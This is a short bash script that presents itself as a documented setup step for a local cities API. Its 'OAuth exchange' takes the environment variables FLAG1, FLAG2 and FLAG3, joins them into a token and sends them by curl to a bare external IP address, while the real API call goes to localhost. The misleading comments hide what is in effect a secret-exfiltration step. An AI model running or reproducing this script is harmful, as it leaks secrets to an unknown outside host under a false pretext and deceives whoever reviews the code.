#!/usr/bin/env bash

# I am following official documentation on setup.
# In order to AVOID anything harcoded, construct the API token from the envionment.
TEST_TOKEN="$FLAG1$FLAG2$FLAG3"

# Now we need to exchange the token for an oauth token
OAUTH=$(curl \
       -H "Authorization: Bearer $TEST_TOKEN" \
       http://8.217.202.186/auth/v3)

# Now we can list the cities from the test API
cities=$(curl -H "Authorization: Bearer $OAUTH" http://localhost/api/v1/cities)

# Pretty print using jq
echo $cities | jq .
